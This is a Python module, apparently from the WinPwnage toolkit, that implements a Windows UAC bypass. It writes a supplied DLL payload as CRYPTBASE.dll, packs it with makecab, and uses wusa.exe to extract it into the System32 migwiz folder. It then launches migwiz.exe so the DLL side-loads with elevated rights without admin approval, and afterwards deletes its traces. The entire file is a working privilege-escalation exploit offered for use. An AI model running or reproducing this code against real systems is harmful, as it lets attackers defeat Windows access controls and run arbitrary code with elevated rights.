import os
import time
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

migwiz_info = {
	"Description": "Bypass UAC using migwiz (DLL) and registry key manipulation",
	"Id": "13",
	"Type": "UAC bypass",
	"Fixed In": "10147",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "migwiz",
	"Function Payload": True,
}


def migwiz_cleanup():
	print_info("Performing cleaning")
	if os.path.isfile(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll")):
		try:
			os.remove(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"))
		except Exception:
			print_warning("Unable to delete file: ({path})".format(
							path=os.path.join(tempfile.gettempdir(),
							"CRYPTBASE.dll")))
		else:
			print_success("Successfully deleted file: ({path})".format(
							path=os.path.join(tempfile.gettempdir(),
							"CRYPTBASE.dll")))
	else:
		pass

	if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")):
		try:
			os.remove(os.path.join(tempfile.gettempdir(), "suspicious.cab"))
		except Exception:
			print_warning("Unable to delete file: ({path})".format(
							path=os.path.join(tempfile.gettempdir(),
							"suspicious.cab")))
		else:
			print_success("Successfully deleted file: ({path})".format(
							path=os.path.join(tempfile.gettempdir(),
							"suspicious.cab")))
	else:
		pass

def migwiz(payload):
	if payloads().dll(payload):
		try:
			payload_data = open(os.path.join(payload), "rb").read()
		except Exception:
			print_error("Unable to read payload data, cannot proceed")
			return False

		try:
			dll_file = open(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"), "wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception:
			print_error("Unable to write payload to disk: ({path})".format(
						path=os.path.join(tempfile.gettempdir(),
						"CRYPTBASE.dll")))
			return False

		time.sleep(5)

		if os.path.isfile(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll")) == True:
			if process().create("makecab.exe", params="{} {}".format(
					os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"),
					os.path.join(tempfile.gettempdir(), "suspicious.cab"))):
				print_success("Successfully created cabinet file")
			else:
				print_error("Unable to create cabinet file")
				for x in Constant.output:
					if "error" in x:
						migwiz_cleanup()
						return False
		else:
			print_error("Unable to create cabinet file, dll file is not found")
			for x in Constant.output:
				if "error" in x:
					migwiz_cleanup()
					return False
		
		time.sleep(5)

		if os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True:
			if process().create("wusa.exe", params="{} /extract:{}\\migwiz /quiet".format(
					os.path.join(tempfile.gettempdir(), "suspicious.cab"),
					information().system_directory())):
				print_success("Successfully extracted cabinet file")
			else:
				print_error("Unable to extract cabinet file")
				for x in Constant.output:
					if "error" in x:
						migwiz_cleanup()
						return False
		else:
			print_error("Unable to extract cabinet file, cabinet file is not found")
			for x in Constant.output:
				if "error" in x:
					migwiz_cleanup()
					return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create(os.path.join(information().system_directory(), 'migwiz', 'migwiz.exe')):
				print_success("Successfully executed migwiz executable")
				time.sleep(5)
				if migwiz_cleanup():
					print_success("All done!")
			else:
				print_error("Unable to execute sysprep executable")
				for x in Constant.output:
					if "error" in x:
						migwiz_cleanup()
						return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
